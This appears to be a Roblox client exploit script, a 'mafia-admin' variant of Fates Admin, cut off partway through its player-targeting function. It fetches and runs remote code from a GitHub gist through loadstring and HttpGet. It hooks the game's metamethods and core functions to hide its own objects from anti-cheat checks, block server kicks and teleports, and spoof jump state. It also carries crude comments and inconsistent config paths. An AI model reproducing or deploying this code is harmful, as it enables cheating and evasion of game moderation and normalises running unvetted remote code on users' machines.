--my dick is small



a = false
wait(0.2)
attackinglol = false
standing = false

hostusername = "a"  -- case sencitive 




local AkaliNotif = loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/9d907e7d3935f96a95497abe4f3ed4f8/raw/0239bdbf9f3a058668f985da6f0af90f8da52d2c/notifications"))();
local Notify = AkaliNotif.Notify;
    local player = game.Players.LocalPlayer
wait(1);
Notify({ 
Description = "hello "..player.Name.." please enjoy";
Title = "welcome";
Duration = 5;
});

joinleavelogs = false


    game.Players.PlayerAdded:Connect(function(plr)
if plr.Name == "xxxLX_0GANxxx" then
Notify({ 
Description = "MAFIA JOINED THE GAME UWUWUWUUWUWUWUUWUW";
Title = "�����";
Duration = 2;
});
mafiajoinedserver = true

end


if plr.Name == "Ligtobrah" then
Notify({ 
Description = "MAFIA JOINED THE GAME UWUWUWUUWUWUWUUWUW";
Title = "�����";
Duration = 2;
});
mafiajoinedserver = true
end

if joinleavelogs == true then
Notify({ 
Description = "player join";
Title = "somone has joined the server";
Duration = 2;
});
end
    
    game.Players.PlayerRemoved:Connect(function(plr)
if joinleavelogs == true then
Notify({ 
Description = "player leave";
Title = "somone has left the server";
Duration = 2;
});
end
end)
end)


local game = game
local GetService = game.GetService
if (not game.IsLoaded(game)) then
    local Loaded = game.Loaded
    Loaded.Wait(Loaded);
end

local _L = {}

_L.start = start or tick();
local Debug = true

do
    local F_A = getgenv().F_A
    if (F_A) then
        local Notify, GetConfig = F_A.Utils.Notify, F_A.GetConfig
        local UserInputService = GetService(game, "UserInputService");
        local CommandBarPrefix = GetConfig().CommandBarPrefix
        local StringKeyCode = UserInputService.GetStringForKeyCode(UserInputService, Enum.KeyCode[CommandBarPrefix]);
        return Notify(nil, "Loaded", "fates admin is already loaded... use 'killscript' to kill", nil),
        Notify(nil, "Your Prefix is", string.format("%s (%s)", StringKeyCode, CommandBarPrefix));
    end
end

--IMPORT [var]
local Services = {
    Workspace = GetService(game, "Workspace");
    UserInputService = GetService(game, "UserInputService");
    ReplicatedStorage = GetService(game, "ReplicatedStorage");
    StarterPlayer = GetService(game, "StarterPlayer");
    StarterPack = GetService(game, "StarterPack");
    StarterGui = GetService(game, "StarterGui");
    TeleportService = GetService(game, "TeleportService");
    CoreGui = GetService(game, "CoreGui");
    TweenService = GetService(game, "TweenService");
    HttpService = GetService(game, "HttpService");
    TextService = GetService(game, "TextService");
    MarketplaceService = GetService(game, "MarketplaceService");
    Chat = GetService(game, "Chat");
    Teams = GetService(game, "Teams");
    SoundService = GetService(game, "SoundService");
    Lighting = GetService(game, "Lighting");
    ScriptContext = GetService(game, "ScriptContext");
    Stats = GetService(game, "Stats");
}

setmetatable(Services, {
    __index = function(Table, Property)
        local Ret, Service = pcall(GetService, game, Property);
        if (Ret) then
            Services[Property] = Service
            return Service
        end
        return nil
    end,
    __mode = "v"
});

local GetChildren, GetDescendants = game.GetChildren, game.GetDescendants
local IsA = game.IsA
local FindFirstChild, FindFirstChildOfClass, FindFirstChildWhichIsA, WaitForChild = 
    game.FindFirstChild,
    game.FindFirstChildOfClass,
    game.FindFirstChildWhichIsA,
    game.WaitForChild

local GetPropertyChangedSignal, Changed = 
    game.GetPropertyChangedSignal,
    game.Changed
    
local Destroy, Clone = game.Destroy, game.Clone

local Heartbeat, Stepped, RenderStepped;
do
    local RunService = Services.RunService;
    Heartbeat, Stepped, RenderStepped =
        RunService.Heartbeat,
        RunService.Stepped,
        RunService.RenderStepped
end

local Players = Services.Players
local GetPlayers = Players.GetPlayers

local JSONEncode, JSONDecode, GenerateGUID = 
    Services.HttpService.JSONEncode, 
    Services.HttpService.JSONDecode,
    Services.HttpService.GenerateGUID

local Camera = Services.Workspace.CurrentCamera

local Tfind, sort, concat, pack, unpack;
do
    local table = table
    Tfind, sort, concat, pack, unpack = 
        table.find, 
        table.sort,
        table.concat,
        table.pack,
        table.unpack
end

local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
do
    local string = string
    lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
        string.lower,
        string.upper,
        string.find,
        string.split, 
        string.sub,
        string.format,
        string.len,
        string.match,
        string.gmatch,
        string.gsub,
        string.byte
end

local random, floor, round, abs, atan, cos, sin, rad;
do
    local math = math
    random, floor, round, abs, atan, cos, sin, rad = 
        math.random,
        math.floor,
        math.round,
        math.abs,
        math.atan,
        math.cos,
        math.sin,
        math.rad
end

local InstanceNew = Instance.new
local CFrameNew = CFrame.new
local Vector3New = Vector3.new

local Inverse, toObjectSpace, components
do
    local CalledCFrameNew = CFrameNew();
    Inverse = CalledCFrameNew.Inverse
    toObjectSpace = CalledCFrameNew.toObjectSpace
    components = CalledCFrameNew.components
end

local Connection = game.Loaded
local CWait = Connection.Wait
local CConnect = Connection.Connect

local Disconnect;
do
    local CalledConnection = CConnect(Connection, function() end);
    Disconnect = CalledConnection.Disconnect
end

local __H = InstanceNew("Humanoid");
local UnequipTools = __H.UnequipTools
local ChangeState = __H.ChangeState
local SetStateEnabled = __H.SetStateEnabled
local GetState = __H.GetState
local GetAccessories = __H.GetAccessories

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui
local Mouse = LocalPlayer.GetMouse(LocalPlayer);

local CThread;
do
    local wrap = coroutine.wrap
    CThread = function(Func, ...)
        if (type(Func) ~= 'function') then
            return nil
        end
        local Varag = ...
        return function()
            local Success, Ret = pcall(wrap(Func, Varag));
            if (Success) then
                return Ret
            end
            if (Debug) then
              print("erroRRR???");
            end
        end
    end
end

local startsWith = function(str, searchString, rawPos)
    local pos = rawPos or 1
    return searchString == "" and true or sub(str, pos, pos) == searchString
end

local trim = function(str)
    return gsub(str, "^%s*(.-)%s*$", "%1");
end

local tbl_concat = function(...)
    local new = {}
    for i, v in next, {...} do
        for i2, v2 in next, v do
            new[i] = v2
        end
    end
    return new
end

local indexOf = function(tbl, val)
    if (type(tbl) == 'table') then
        for i, v in next, tbl do
            if (v == val) then
                return i
            end
        end
    end
end

local forEach = function(tbl, ret)
    for i, v in next, tbl do
        ret(i, v);
    end
end

local filter = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            if (ret(i, v)) then
                new[#new + 1] = v
            end
        end
        return new
    end
end

local map = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            local Value, Key = ret(i, v);
            new[Key or #new + 1] = Value
        end
        return new
    end
end

local deepsearch;
deepsearch = function(tbl, ret)
    if (type(tbl) == 'table') then
        for i, v in next, tbl do
            if (type(v) == 'table') then
                deepsearch(v, ret);
            end
            ret(i, v);
        end
    end
end

local deepsearchset;
deepsearchset = function(tbl, ret, value)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            new[i] = v
            if (type(v) == 'table') then
                new[i] = deepsearchset(v, ret, value);
            end
            if (ret(i, v)) then
                new[i] = value(i, v);
            end
        end
        return new
    end
end

local flat = function(tbl)
    if (type(tbl) == 'table') then
        local new = {}
        deepsearch(tbl, function(i, v)
            if (type(v) ~= 'table') then
                new[#new + 1] = v
            end
        end)
        return new
    end
end

local flatMap = function(tbl, ret)
    if (type(tbl) == 'table') then
        local new = flat(map(tbl, ret));
        return new
    end
end

local shift = function(tbl)
    if (type(tbl) == 'table') then
        local firstVal = tbl[1]
        tbl = pack(unpack(tbl, 2, #tbl));
        tbl.n = nil
        return tbl
    end
end

local keys = function(tbl)
    if (type(tbl) == 'table') then
        local new = {}
        for i, v in next, tbl do
            new[#new + 1] = i	
        end
        return new
    end
end

local function clone(toClone, shallow)
    if (type(toClone) == 'function' and clonefunction) then
        return clonefunction(toClone);
    end
    local new = {}
    for i, v in pairs(toClone) do
        if (type(v) == 'table' and not shallow) then
            v = clone(v);
        end
        new[i] = v
    end
    return new
end

local setthreadidentity = setthreadidentity or syn_context_set or setthreadcontext
local getthreadidentity = getthreadidentity or syn_context_get or getthreadcontext
--END IMPORT [var]



local GetCharacter = GetCharacter or function(Plr)
    return Plr and Plr.Character or LocalPlayer.Character
end

local Utils = {}

--IMPORT [extend]
local SocialService = game:GetService("SocialService")
local firetouchinterest, hookfunction, getconnections;
do
    local GEnv = getgenv();
    local touched = {}
    firetouchinterest = GEnv.firetouchinterest or function(part1, part2, toggle)
        if (part1 and part2) then
            if (toggle == 0) then
                touched[1] = part1.CFrame
                part1.CFrame = part2.CFrame
            else
                part1.CFrame = touched[1]
                touched[1] = nil
            end
        end
    end
    local newcclosure = newcclosure or function(f)
        return f
    end

    hookfunction = GEnv.hookfunction or function(func, newfunc, applycclosure)
        if (replaceclosure) then
            replaceclosure(func, newfunc);
            return func
        end
        func = applycclosure and newcclosure or newfunc
        return func
    end

    local CachedConnections = setmetatable({}, {
        __mode = "v"
    });

    getconnections = function(Connection, FromCache, AddOnConnect)
        local getconnections = GEnv.getconnections
        if (not getconnections) then
            return {}
        end
        
        local CachedConnection;
        for i, v in next, CachedConnections do
            if (i == Connection) then
                CachedConnection = v
                break;
            end
        end
        if (CachedConnection and FromCache) then
            return CachedConnection
        end

        local Connections = GEnv.getconnections(Connection);
        CachedConnections[Connection] = Connections
        return Connections
    end
end

local getrawmetatable = getrawmetatable or function()
    return setmetatable({}, {});
end

local getnamecallmethod = getnamecallmethod or function()
    return ""
end

local checkcaller = checkcaller or function()
    return false
end

local Hooks = {
    AntiKick = false,
    AntiTeleport = false,
    NoJumpCooldown = false,
}

local mt = getrawmetatable(game);
local OldMetaMethods = {}
setreadonly(mt, false);
for i, v in next, mt do
    OldMetaMethods[i] = v
end
setreadonly(mt, true);
local MetaMethodHooks = {}

local ProtectInstance, SpoofInstance, SpoofProperty;
local UnSpoofInstance;
local ProtectedInstances = setmetatable({}, {
    __mode = "v"
});
do
    local SpoofedInstances = setmetatable({}, {
        __mode = "v"
    });
    local SpoofedProperties = {}
    Hooks.SpoofedProperties = SpoofedProperties

    ProtectInstance = function(Instance_)
        if (not Tfind(ProtectedInstances, Instance_)) then
            ProtectedInstances[#ProtectedInstances + 1] = Instance_
        end
    end
    
    SpoofInstance = function(Instance_, Instance2)
        if (not SpoofedInstances[Instance_]) then
            SpoofedInstances[Instance_] = Instance2 and Instance2 or Clone(Instance_);
        end
    end

    UnSpoofInstance = function(Instance_)
        if (SpoofedInstances[Instance_]) then
            SpoofedInstances[Instance_] = nil
        end
    end
    
    local ChangedSpoofedProperties = {}
    SpoofProperty = function(Instance_, Property, NoClone)
        if (SpoofedProperties[Instance_]) then
            local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]
            local Properties = map(SpoofedPropertiesForInstance, function(i, v)
                return v.Property
            end)
            if (not Tfind(Properties, Property)) then
                SpoofedProperties[Instance_][#SpoofedPropertiesForInstance + 1] = {
                    SpoofedProperty = SpoofedPropertiesForInstance.SpoofedProperty,
                    Property = Property,
                };
            end
        else
            local Cloned;
            if (not NoClone and IsA(Instance_, "Instance") and not Services[tostring(Instance_)] and Instance_.Archivable) then
                local Success, Ret = pcall(Clone, Instance_);
                if (Success) then
                    Cloned = Ret
                end
            end
            SpoofedProperties[Instance_] = {{
                SpoofedProperty = Cloned and Cloned or {[Property]=Instance_[Property]},
                Property = Property,
            }}
            ChangedSpoofedProperties[Instance_] = {}
        end
    end

    local GetAllParents = function(Instance_, NIV)
        if (typeof(Instance_) == "Instance") then
            local Parents = {}
            local Current = NIV or Instance_
            if (NIV) then
                Parents[#Parents + 1] = Current
            end
            repeat
                local Parent = Current.Parent
                Parents[#Parents + 1] = Parent
                Current = Parent
            until not Current
            return Parents
        end
        return {}
    end
    
    local Methods = {
        "FindFirstChild",
        "FindFirstChildWhichIsA",
        "FindFirstChildOfClass",
        "IsA"
    }

    MetaMethodHooks.Namecall = function(...)
        local __Namecall = OldMetaMethods.__namecall;
        local Args = {...}
        local self = Args[1]
        local Method = getnamecallmethod() or "";

        if (Method ~= "") then
            local Success = pcall(OldMetaMethods.__index, self, Method);
            if (not Success) then
                return __Namecall(...);
            end
        end

        if (Hooks.AntiKick and lower(Method) == "kick") then
            local Player, Message = self, Args[2]
            if (Hooks.AntiKick and Player == LocalPlayer) then
                local Notify = Utils.Notify
                local Context;
                if (setthreadidentity) then
                    Context = getthreadidentity();
                    setthreadidentity(3);
                end
                if (Notify and Context) then
                    Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
                    setthreadidentity(Context);
                end
                return
            end
        end

        if (Hooks.AntiTeleport and Method == "Teleport" or Method == "TeleportToPlaceInstance") then
            local Player, PlaceId = self, Args[2]
            if (Hooks.AntiTeleport and Player == LocalPlayer) then
                local Notify = Utils.Notify
                local Context;
                if (setthreadidentity) then
                    Context = getthreadidentity();
                    setthreadidentity(3);
                end
                if (Notify and Context) then
                    Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
                    setthreadidentity(Context);
                end
                return
            end
        end

        if (checkcaller()) then
            return __Namecall(...);
        end

        if (Tfind(Methods, Method)) then
            local ReturnedInstance = __Namecall(...);
            if (Tfind(ProtectedInstances, ReturnedInstance)) then
                return Method == "IsA" and false or nil
            end
        end
        
        if (lower(Method) == "getchildren" or lower(Method) == "getdescendants") then
            return filter(__Namecall(...), function(i, v)
                local Protected = false
                for i2 = 1, #ProtectedInstances do
                    local ProtectedInstance = ProtectedInstances[i2]
                    Protected = ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance);
                    if (Protected) then
                        break;
                    end
                end
                return not Protected
            end)
        end

        if (Method == "GetFocusedTextBox") then
            local Protected = false
            for i = 1, #ProtectedInstances do
                local ProtectedInstance = ProtectedInstances[i]
                Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
            end
            if (Protected) then
                return nil
            end
        end

        if (Hooks.NoJumpCooldown and Method == "GetState" or Method == "GetStateEnabled") then
            local State = __Namecall(...);
            if (Method == "GetState" and (State == Enum.HumanoidStateType.Jumping or State == "Jumping")) then
                return Enum.HumanoidStateType.RunningNoPhysics
            end
            if (Method == "GetStateEnabled" and (self == Enum.HumanoidStateType.Jumping or self == "Jumping")) then
                return false
            end
        end

        return __Namecall(...);
    end

    local AllowedIndexes = {
        "RootPart",
        "Parent"
    }
    local AllowedNewIndexes = {
        "Jump"
    }
    MetaMethodHooks.Index = function(...)
        local __Index = OldMetaMethods.__index;

        if (checkcaller()) then
            return __Index(...);
        end
        local Instance_, Index = ...

        local SanitisedIndex = Index
        if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
            SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
        end
        local SpoofedInstance = SpoofedInstances[Instance_]
        local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

        if (SpoofedInstance) then
            if (Tfind(AllowedIndexes, SanitisedIndex)) then
                return __Index(Instance_, Index);
            end
            return __Index(SpoofedInstance, Index);
        end

        if (SpoofedPropertiesForInstance) then
            for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
                local SanitisedIndex = gsub(SanitisedIndex, "^%l", upper);
                if (SanitisedIndex == SpoofedProperty.Property) then
                    local ClientChangedData = ChangedSpoofedProperties[Instance_][SanitisedIndex]
                    local IndexedSpoofed = __Index(SpoofedProperty.SpoofedProperty, Index);
                    local Indexed = __Index(Instance_, Index);
                    if (ClientChangedData.Caller and ClientChangedData.Value ~= Indexed) then
                        OldMetaMethods.__newindex(SpoofedProperty.SpoofedProperty, Index, Indexed);
                        OldMetaMethods.__newindex(Instance_, Index, ClientChangedData.Value);
                        return Indexed
                    end
                    return IndexedSpoofed
                end
            end
        end

        if (Tfind(ProtectedInstances, __Index(...))) then
            return nil
        end
        if (Tfind(ProtectedInstances, Instance_) and SanitisedIndex == "ClassName") then
            return "Part"
        end

        if (Hooks.NoJumpCooldown and SanitisedIndex == "Jump") then
            if (IsA(Instance_, "Humanoid")) then
                return false
            end
        end
        
        return __Index(...);
    end

    MetaMethodHooks.NewIndex = function(...)
        local __NewIndex = OldMetaMethods.__newindex;
        local __Index = OldMetaMethods.__index;
        local Instance_, Index, Value = ...

        local SpoofedInstance = SpoofedInstances[Instance_]
        local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

        if (checkcaller()) then
            if (Index == "Parent" and Value) then
                local ProtectedInstance
                for i = 1, #ProtectedInstances do
                    local ProtectedInstance_ = ProtectedInstances[i]
                    if (Instance_ == ProtectedInstance_ or Instance_.IsDescendantOf(Value, ProtectedInstance_)) then
                        ProtectedInstance = true
                    end
                end
                if (ProtectedInstance) then
                    local Parents = GetAllParents(Instance_, Value);
                    for i, v in next, getconnections(Parents[1].ChildAdded, true) do
                        v.Disable(v);
                    end
                    for i = 1, #Parents do
                        local Parent = Parents[i]
                        for i2, v in next, getconnections(Parent.DescendantAdded, true) do
                            v.Disable(v);
                        end
                    end
                    local Ret = __NewIndex(...);
                    for i = 1, #Parents do
                        local Parent = Parents[i]
                        for i2, v in next, getconnections(Parent.DescendantAdded, true) do
                            v.Enable(v);
                        end
                    end
                    for i, v in next, getconnections(Parents[1].ChildAdded, true) do
                        v.Enable(v);
                    end
                    return Ret
                end
            end
            if (SpoofedInstance or SpoofedPropertiesForInstance) then
                if (SpoofedPropertiesForInstance) then
                    ChangedSpoofedProperties[Instance_][Index] = {
                        Caller = true,
                        BeforeValue = Instance_[Index],
                        Value = Value
                    }
                end
                local Connections = tbl_concat(
                    getconnections(GetPropertyChangedSignal(Instance_, SpoofedPropertiesForInstance and SpoofedPropertiesForInstance.Property or Index)),
                    getconnections(Instance_.Changed),
                    getconnections(game.ItemChanged)
                )
                
                if (not next(Connections)) then
                    return __NewIndex(Instance_, Index, Value);
                end
                for i, v in next, Connections do
                    v.Disable(v);
                end
                local Ret = __NewIndex(Instance_, Index, Value);
                for i, v in next, Connections do
                    v.Enable(v);
                end
                return Ret
            end
            return __NewIndex(...);
        end

        local SanitisedIndex = Index
        if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
            SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
        end

        if (SpoofedInstance) then
            if (Tfind(AllowedNewIndexes, SanitisedIndex)) then
                return __NewIndex(...);
            end
            return __NewIndex(SpoofedInstance, Index, __Index(SpoofedInstance, Index));
        end

        if (SpoofedPropertiesForInstance) then
            for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
                if (SpoofedProperty.Property == SanitisedIndex and not Tfind(AllowedIndexes, SanitisedIndex)) then
                    ChangedSpoofedProperties[Instance_][SanitisedIndex] = {
                        Caller = false,
                        BeforeValue = Instance_[Index],
                        Value = Value
                    }
                    return __NewIndex(SpoofedProperty.SpoofedProperty, Index, Value);
                end
            end
        end

        return __NewIndex(...);
    end

    local hookmetamethod = hookmetamethod or function(metatable, metamethod, func)
        setreadonly(metatable, false);
        Old = hookfunction(metatable[metamethod], func, true);
        setreadonly(metatable, true);
        return Old
    end

    OldMetaMethods.__index = hookmetamethod(game, "__index", MetaMethodHooks.Index);
    OldMetaMethods.__newindex = hookmetamethod(game, "__newindex", MetaMethodHooks.NewIndex);
    OldMetaMethods.__namecall = hookmetamethod(game, "__namecall", MetaMethodHooks.Namecall);
end

Hooks.OldGetChildren = hookfunction(game.GetChildren, newcclosure(function(...)
    if (not checkcaller()) then
        local Children = Hooks.OldGetChildren(...);
        return filter(Children, function(i, v)
            return not Tfind(ProtectedInstances, v);
        end)
    end
    return Hooks.OldGetChildren(...);
end));

Hooks.OldGetDescendants = hookfunction(game.GetDescendants, newcclosure(function(...)
    if (not checkcaller()) then
        local Descendants = Hooks.OldGetDescendants(...);
        return filter(Descendants, function(i, v)
            local Protected = false
            for i2 = 1, #ProtectedInstances do
                local ProtectedInstance = ProtectedInstances[i2]
                Protected = v and ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance)
                if (Protected) then
                    break;
                end
            end
            return not Protected
        end)
    end
    return Hooks.OldGetDescendants(...);
end));

Hooks.FindFirstChild = hookfunction(game.FindFirstChild, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChild(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChild(...);
end));
Hooks.FindFirstChildOfClass = hookfunction(game.FindFirstChildOfClass, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChildOfClass(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChildOfClass(...);
end));
Hooks.FindFirstChildWhichIsA = hookfunction(game.FindFirstChildWhichIsA, newcclosure(function(...)
    if (not checkcaller()) then
        local ReturnedInstance = Hooks.FindFirstChildWhichIsA(...);
        if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
            return nil
        end
    end
    return Hooks.FindFirstChildWhichIsA(...);
end));
Hooks.IsA = hookfunction(game.IsA, newcclosure(function(...)
    if (not checkcaller()) then
        local Args = {...}
        local IsACheck = Args[1]
        if (IsACheck) then
            local ProtectedInstance = Tfind(ProtectedInstances, IsACheck);
            if (ProtectedInstance and Args[2]) then
                return false
            end
        end
    end
    return Hooks.IsA(...);
end));

local UndetectedCmdBar;
Hooks.OldGetFocusedTextBox = hookfunction(Services.UserInputService.GetFocusedTextBox, newcclosure(function(...)
    if (not checkcaller() and UndetectedCmdBar) then
        local FocusedTextBox = Hooks.OldGetFocusedTextBox(...);
        local Protected = false
        for i = 1, #ProtectedInstances do
            local ProtectedInstance = ProtectedInstances[i]
            Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
        end
        if (Protected) then
            return nil
        end
    end
    return Hooks.OldGetFocusedTextBox(...);
end));

Hooks.OldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(...)
    local Player, Message = ...
    if (Hooks.AntiKick and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
            setthreadidentity(Context)
        end
        return
    end
    return Hooks.OldKick(...);
end))

Hooks.OldTeleportToPlaceInstance = hookfunction(Services.TeleportService.TeleportToPlaceInstance, newcclosure(function(...)
    local Player, PlaceId = ...
    if (Hooks.AntiTeleport and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
            setthreadidentity(Context)
        end
        return
    end
    return Hooks.OldTeleportToPlaceInstance(...);
end))
Hooks.OldTeleport = hookfunction(Services.TeleportService.Teleport, newcclosure(function(...)
    local Player, PlaceId = ...
    if (Hooks.AntiTeleport and Player == LocalPlayer) then
        local Notify = Utils.Notify
        local Context;
        if (setthreadidentity) then
            Context = getthreadidentity();
            setthreadidentity(3);
        end
        if (Notify and Context) then
            Notify(nil, "Attempt to teleport", format("attempt to teleport to place \"%s\"", PlaceId and PlaceId or ""));
            setthreadidentity(Context);
        end
        return
    end
    return Hooks.OldTeleport(...);
end))

Hooks.GetState = hookfunction(GetState, function(...)
    local Humanoid, State = ..., Hooks.GetState(...);
    local Parent, Character = Humanoid.Parent, LocalPlayer.Character
    if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
        return Enum.HumanoidStateType.RunningNoPhysics
    end
    return State
end)

Hooks.GetStateEnabled = hookfunction(__H.GetStateEnabled, function(...)
    local Humanoid, State = ...
    local Ret = Hooks.GetStateEnabled(...);
    local Parent, Character = Humanoid.Parent, LocalPlayer.Character
    if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
        return false
    end
    return Ret
end)
--END IMPORT [extend]



local GetRoot = function(Plr, Char)
    local LCharacter = GetCharacter();
    local Character = Char or GetCharacter(Plr);
    return Plr and Character and (FindFirstChild(Character, "HumanoidRootPart") or FindFirstChild(Character, "Torso") or FindFirstChild(Character, "UpperTorso")) or LCharacter and (FindFirstChild(LCharacter, "HumanoidRootPart") or FindFirstChild(LCharacter, "Torso") or FindFirstChild(LCharacter, "UpperTorso"));
end

local GetHumanoid = function(Plr, Char)
    local LCharacter = GetCharacter();
    local Character = Char or GetCharacter(Plr);
    return Plr and Character and FindFirstChildWhichIsA(Character, "Humanoid") or LCharacter and FindFirstChildWhichIsA(LCharacter, "Humanoid");
end

local GetMagnitude = function(Plr, Char)
    local LRoot = GetRoot();
    local Root = GetRoot(Plr, Char);
    return Plr and Root and (Root.Position - LRoot.Position).magnitude or math.huge
end

local Settings = {
    Prefix = "!",
    CommandBarPrefix = "Semicolon",
    ChatPrediction = false,
    Macros = {},
    Aliases = {},
}
local PluginSettings = {
    PluginsEnabled = true,
    PluginDebug = false,
    DisabledPlugins = {
        ["PluginName"] = true
    },
    SafePlugins = false
}

local WriteConfig = function(Destroy)
    local JSON = JSONEncode(Services.HttpService, Settings);
    local PluginJSON = JSONEncode(Services.HttpService, PluginSettings);
    if (isfolder("mafia-admin") and Destroy) then
        delfolder("mafia-admin");
        writefile("mafia-admin/config.json", JSON);
        writefile("fates/admin/pluings/plugin-conf.json", PluginJSON);
    else
        makefolder("mafia-admin");
        makefolder("mafia-admin/plugins");
        makefolder("mafia-admin/chatlogs");
        writefile("mafia-admin/config.json", JSON);
        writefile("mafia-admin/plugins/plugin-conf.json", PluginJSON);
    end
end

local GetConfig = function()
    if (isfolder("mafia-admin") and isfile("mafia-admin/config.json")) then
        return JSONDecode(Services.HttpService, readfile("mafia-admin/config.json"));
    else
        WriteConfig();
        return JSONDecode(Services.HttpService, readfile("mafia-admin/config.json"));
    end
end

local GetPluginConfig = function()
    if (isfolder("mafia-admin") and isfolder("mafia-admin/plugins") and isfile("mafia-admin/plugins/plugin-conf.json")) then
        local JSON = JSONDecode(Services.HttpService, readfile("mafia-admin/plugins/plugin-conf.json"));
        return JSON
    else
        WriteConfig();
        return JSONDecode(Services.HttpService, readfile("fates-admin/plugins/plugin-conf.json"));
    end
end

local SetPluginConfig = function(conf)
    if (isfolder("mafia-admin") and isfolder("mafia-admin/plugins") and isfile("mafia-admin/plugins/plugin-conf.json")) then
        WriteConfig();
    end
    local NewConfig = GetPluginConfig();
    for i, v in next, conf do
        NewConfig[i] = v
    end
    writefile("mafia-admin/plugins/plugin-conf.json", JSONEncode(Services.HttpService, NewConfig));
end

local SetConfig = function(conf)
    if (not isfolder("mafia-admin") and isfile("mafia-admin/config.json")) then
        WriteConfig();
    end
    local NewConfig = GetConfig();
    for i, v in next, conf do
        NewConfig[i] = v
    end
    writefile("mafia-admin/config.json", JSONEncode(Services.HttpService, NewConfig));
end

local CurrentConfig = GetConfig();
local Prefix = isfolder and CurrentConfig.Prefix or "!"
local Macros = CurrentConfig.Macros or {}
local AdminUsers = AdminUsers or {}
local Exceptions = Exceptions or {}
local Connections = {
    Players = {}
}
_L.CLI = false
_L.ChatLogsEnabled = true
_L.GlobalChatLogsEnabled = false
_L.HttpLogsEnabled = true

local GetPlayer;
GetPlayer = function(str, noerror)
    local CurrentPlayers = filter(GetPlayers(Players), function(i, v)
        return not Tfind(Exceptions, v);
    end)
    if (not str) then
        return {}
    end
    str = lower(trim(str));
    if (Sfind(str, ",")) then
        return flatMap(split(str, ","), function(i, v)
            return GetPlayer(v, noerror);
        end)
    end

    local Magnitudes = map(CurrentPlayers, function(i, v)
        return {v,(GetRoot(v).CFrame.p - GetRoot().CFrame.p).Magnitude}
    end)

    local PlayerArgs = {
        ["all"] = function()
            return filter(CurrentPlayers, function(i, v) -- removed all arg (but not really) due to commands getting messed up and people getting confused
                return v ~= LocalPlayer
            end)
        end,
        ["others"] = function()
            return filter(CurrentPlayers, function(i, v)
                return v ~= LocalPlayer
            end)
        end,
        ["nearest"] = function()
            sort(Magnitudes, function(a, b)
                return a[2] < b[2]
            end)
            return {Magnitudes[2][1]}
        end,
        ["farthest"] = function()
            sort(Magnitudes, function(a, b)
                return a[2] > b[2]
            end)
            return {Magnitudes[2][1]}
        end,
        ["random"] = function()
            return {CurrentPlayers[random(2, #CurrentPlayers)]}
        end,
        ["allies"] = function()
            local LTeam = LocalPlayer.Team
            return filter(CurrentPlayers, function(i, v)
                return v.Team == LTeam
            end)
        end,
        ["enemies"] = function()
            local LTeam = LocalPlayer.Team
            return filter(CurrentPlayers, function(i, v)
                return v.Team ~= LTeam
            end)
        end,
        ["npcs"] = function()
            local NPCs = {}
            local Descendants = GetDescendants(Workspace);
            local GetPlayerFromCharacter = Players.GetPlayerFromCharacter
            for i = 1, #Descendants do
                local Descendant = Descendants[i]
                local DParent = Descendant.Parent
                if (IsA(Descendant, "Humanoid") and IsA(DParent, "Model") and (FindFirstChild(DParent, "HumanoidRootPart") or FindFirstChild(DParent, "Head")) and GetPlayerFromCharacter(Players, DParent) == nil) then
                    local FakePlr = InstanceNew("Player"); -- so it can be compatible with commands
                    FakePlr.Character = DParent
                    FakePlr.Name = format("%s %s", DParent.Name, "- " .. Descendant.DisplayName);
                    NPCs[#NPCs + 1] = FakePlr
                end
            end
            return NPCs
        end,
        ["me"] = function()
            return {LocalPlayer}
        end
    }

    if (PlayerArgs[str]) then
        return PlayerArgs[str]();
    end

    local Players = filter(CurrentPlayers, function(i, v)
        return (sub(lower(v.Name), 1, #str) == str) or (sub(lower(v.DisplayName), 1, #str) == str);
